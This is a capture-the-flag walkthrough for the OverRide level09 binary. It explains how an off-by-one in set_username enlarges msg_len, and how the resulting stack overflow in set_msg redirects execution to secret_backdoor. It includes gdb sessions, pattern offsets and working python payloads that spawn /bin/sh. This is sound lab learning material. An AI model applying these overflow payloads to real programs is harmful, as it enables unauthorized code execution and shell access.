There is a looping error in the `set_username` function of the code. This error allows input from the user to exceed its limits and increases the message length by modifying the `msg_len` variable. Because `i < 41` is used in the loop, the 41st character overwrites the `msg_len` variable. This increases the message length limit, allowing more data to be written. Our `msg_len` variable is normally 140 (0x8c), but we send ‘\xff’ as payload to make the `msg_len` size 255 (0xff). Since the limit is now 255, the second function, `set_msg`, allows us to cause a Stack Overflow.

---
```diff
+level09@OverRide:~$ gdb ./level09
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/users/level09/level09...(no debugging symbols found)...done.
+(gdb) b main
Breakpoint 1 at 0xaac
+(gdb) r
Starting program: /home/users/level09/level09
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000

Breakpoint 1, 0x0000555555554aac in main ()
+(gdb) p secret_backdoor
+$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```

When the stack is completely full, the address of the target function is written onto the return address (RIP).
**Payload:** `\x8c\x48\x55\x55\x55\x55\x00\x00`


When the secret function (`secret_backdoor`) runs, it waits for a command from us via `fgets`.
**`\n` (Enter):** This terminates the first `fgets` read (the message retrieval process) and ensures that the subsequent data (`/bin/sh`) remains with the secret function (Stream Separation).

```diff
+(gdb) run < <(python -c 'print "A"*40 + "\xff" + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"')
Starting program: /home/users/level09/level09 < <(python -c 'print "A"*40 + "\xff" + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"')
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x0000555555554931 in handle_msg ()
+(gdb) x/x $rsp
+0x7fffffffe5c8: 0x37674136
```

```
You can use the world's best offset finder site :)
https://lujiangz.github.io/tools/pattern/index.html
```

```
(python -c 'print("\xff"*127 + "A"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00")'; cat) | ./level09
```
This was the payload we initially created, but we kept getting a segfault after a single command, so we decided to change our payload to make things easier in evo.

```
(python -c 'print("\xff"*127 + "A"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n/bin/sh")'; cat) | ./level09
```

You can obtain the flag with either payload, but the second one works more smoothly.